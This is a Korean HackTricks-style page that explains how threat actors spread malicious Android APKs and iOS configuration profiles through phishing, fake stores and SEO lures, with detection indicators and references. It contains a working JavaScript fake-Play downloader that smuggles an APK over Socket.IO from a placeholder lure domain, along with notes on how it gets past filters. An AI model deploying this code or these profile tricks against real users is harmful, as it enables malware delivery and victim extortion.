# 모바일 피싱 및 악성 앱 배포 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지에서는 위협 행위자가 피싱(SEO, social engineering, 가짜 스토어, 데이팅 앱 등)을 통해 **악성 Android APK**와 **iOS 모바일 구성 프로파일**을 배포하는 데 사용하는 기법을 다룹니다.
> 이 자료는 Zimperium zLabs가 공개한 SarangTrap 캠페인(2025) 및 기타 공개 연구를 바탕으로 작성되었습니다.<sup>[[1]](#references)</sup>

## 공격 흐름

1. **SEO/피싱 인프라**
   * 비슷해 보이는 도메인을 수십 개 등록합니다(데이팅, 클라우드 공유, 차량 서비스 등).  
     – Google 검색 순위를 높이기 위해 `<title>` 요소에 현지 언어 키워드와 이모지를 사용합니다.  
     – 같은 랜딩 페이지에서 Android (`.apk`)와 iOS 설치 안내를 모두 호스팅합니다.
2. **초기 다운로드**
   * Android: *서명되지 않은* APK 또는 “서드파티 스토어” APK로 연결되는 직접 링크.  
   * iOS: 악성 **mobileconfig** 프로파일로 연결되는 `itms-services://` 링크 또는 일반 HTTPS 링크(아래 참조).
3. **Android 설치 후 동작**
   * C2 기반 실행, 권한 악용, dropper 우회, 백그라운드 수집 및 기타 설치 후 악성코드 동작은 아래의 전용 Android Malware Post-Exploitation 페이지에서 다룹니다.
4. **iOS 전달 기법**
   * 하나의 **모바일 구성 프로파일**이 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등을 요청하여 기기를 “MDM”과 유사한 감독 모드로 등록할 수 있습니다.  
   * Social engineering 안내:
     1. Settings ➜ *Profile downloaded*를 엽니다.
     2. *Install*을 세 번 누릅니다(피싱 페이지의 스크린샷 참고).  
     3. 서명되지 않은 프로파일을 신뢰하면 공격자가 App Store 검토 없이 *Contacts* 및 *Photo* 권한을 얻습니다.
5. **iOS Web Clip 페이로드 (피싱 앱 아이콘)**
   * `com.apple.webClip.managed` 페이로드를 사용하면 브랜드 아이콘/레이블이 적용된 피싱 URL을 **홈 화면에 고정**할 수 있습니다.
   * Web Clip은 **전체 화면**으로 실행되어 브라우저 UI를 숨길 수 있으며, **제거 불가**로 설정할 수도 있습니다. 이 경우 아이콘을 제거하려면 피해자가 프로파일을 삭제해야 합니다.<sup>[[3]](#references)</sup>
6. **네트워크 계층**
   * 일반 HTTP를 사용하며, HOST 헤더는 `api.<phishingdomain>.com`과 같은 형식이고 포트 80에서 동작하는 경우가 많습니다.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS 미사용 → 쉽게 탐지 가능).

## Android Malware Post-Exploitation

C2, Accessibility 악용, 오버레이, ATS 자동화, staged DEX 로딩, 프리미엄 SMS 및 지속성 등 Android 악성코드의 설치 후 tradecraft는 다음을 참조하세요.

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket 기반 APK 스머글링 및 가짜 Google Play 페이지

공격자는 정적인 APK 링크 대신 Google Play처럼 보이는 유인 페이지에 Socket.IO/WebSocket 채널을 삽입하는 방식을 점점 더 많이 사용합니다. 이 방식은 페이로드 URL을 숨기고, URL/확장자 필터를 우회하며, 실제와 같은 설치 UX를 유지합니다.<sup>[[2]](#references)[[4]](#references)</sup>

실제 공격에서 관찰된 일반적인 클라이언트 흐름:

<details>
<summary>Socket.IO 가짜 Play 다운로더 (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

간단한 통제를 우회하는 이유:
- 고정된 APK URL이 노출되지 않습니다. payload는 WebSocket 프레임에서 메모리상으로 재구성됩니다.
- 직접적인 .apk 응답을 차단하는 URL/MIME/확장자 필터는 WebSocket/Socket.IO를 통해 터널링되는 바이너리 데이터를 놓칠 수 있습니다.
- WebSocket을 실행하지 않는 크롤러와 URL 샌드박스는 payload를 가져오지 못합니다.

WebSocket 기법 및 도구도 참고하세요.

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [로맨스의 어두운 면: SarangTrap 갈취 캠페인](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple 기기의 Web Clips payload 설정](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [인도네시아 및 베트남 Android 사용자를 표적으로 삼는 뱅킹 트로이목마](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
